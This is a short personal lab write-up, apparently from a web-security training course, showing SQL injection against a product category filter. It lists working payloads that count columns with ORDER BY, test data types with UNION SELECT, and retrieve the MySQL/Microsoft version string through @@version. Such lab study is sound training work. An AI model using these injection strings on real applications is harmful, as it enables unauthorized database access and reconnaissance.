---
title: 'Lab 8: SQLi, querying the database type and versio...'
updated: 2022-12-01T14:00:36.0000000+04:00
created: 2022-12-01T11:50:47.0000000+04:00
---

AM
**<u>(Lab-08)</u>** - **<u>SQL Injection, querying database type and version on MySQL and Microsoft</u>**

**SQL Injection Vulnerability** - Product Category Filter

**End Goal** - Display the database version string

**<u>Analysis:</u>**

1.  Determine the number of columns

| Query to use | ' ORDER BY 2# | \# is also a comment command like -- |
|--------------|---------------|--------------------------------------|

![image1](image1-190.png)

| Query to use | ' ORDER BY 3# | Get Internet Server Error 500 Status Code |
|--------------|---------------|-------------------------------------------|

- That means that the number of columns is 2

2.  Determine the Data Types of the Columns

| Query to use | ' UNION SELECT 'a','a'# | Will return a 200 ok status |
|--------------|-------------------------|-----------------------------|

![image2](image2-86.png)

3.  Determine the Database Version and Type for MySQL and Microsoft

| Query to use | ' UNION SELECT NULL,@@version# |
|--------------|--------------------------------|

![image3](image3-55.png)
